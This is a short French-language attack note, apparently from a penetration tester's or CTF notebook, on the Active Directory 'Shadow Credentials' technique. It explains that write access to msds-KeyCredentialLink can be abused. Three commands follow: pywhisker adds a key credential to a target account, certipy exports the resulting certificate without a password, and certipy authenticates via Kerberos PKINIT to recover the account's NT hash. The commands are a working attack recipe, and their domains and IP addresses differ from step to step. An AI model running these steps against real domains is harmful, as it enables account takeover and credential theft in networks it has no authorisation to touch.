
> [!TIP]
> La possibilité d'écrire dans la propriété « msds-KeyCredentialLink » d'un utilisateur ou d'un ordinateur. Cette écriture permet à un attaquant de créer des « Shadow Credentials » sur l'objet et de s'authentifier en tant que principal via Kerberos PKINIT.


1. Création du shadow credential

```sh
pywhisker.py -d "domain.local" --dc-ip "10.10.11.72" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```

2. Exporter le certificat pour l'utiliser sans mot de passe

```sh
certipy-ad cert -export -pfx 046POkXc.pfx -password "ehYBwigAlvOPo9pJtEH5" -out "unprotected.pfx"
```


3. Pass the certificate + UnPAC the hash

```bash
certipy-ad auth -pfx unprotected.pfx -username "ZPH-SVRMGMT1$" -domain zsm.local -dc-ip 192.168.210.10
```

